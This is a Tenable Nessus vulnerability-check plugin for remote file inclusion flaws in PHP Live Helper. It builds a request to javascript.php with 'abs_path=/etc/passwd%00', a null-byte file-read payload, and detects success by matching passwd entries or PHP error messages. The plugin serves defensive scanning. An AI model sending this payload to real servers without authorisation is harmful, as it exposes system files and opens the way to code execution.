#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21159);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-1477", "CVE-2006-4051");
  # also formerly BID 17266.
  script_bugtraq_id(18509, 19349);
  script_osvdb_id(
    24193, 
    24194, 
    24195, 
    24196, 
    24197, 
    24198, 
    24199, 
    29078
 );

  script_name(english:"PHP Live Helper Multiple Remote File Inclusions");
  script_summary(english:"Tries to read /etc/passwd using PHP Live Helper");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
several remote file include flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PHP Help Live, a commercial web-based
real-time help tool written using PHP and MySQL. 

The version of PHP Help Live installed on the remote host fails to
sanitize input to the 'abs_path' parameter before using it in various
scripts to include files with PHP code.  An unauthenticated attacker
may be able to exploit these issues to view arbitrary files or to
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/428976/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/437648/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/442219/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/26");
 script_cvs_date("$Date: 2012/09/10 21:41:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:turnkey_web_tools:php_live_helper");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded:0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phplivehelper", "/livehelp", "/help", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/javascript.php?",
      "abs_path=", file
    ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0global\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0global\.php'", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd[^)]*\): failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File \(/etc/passwd", string:res)
  )
  {
    security_hole(port);
    exit(0);
  }
}
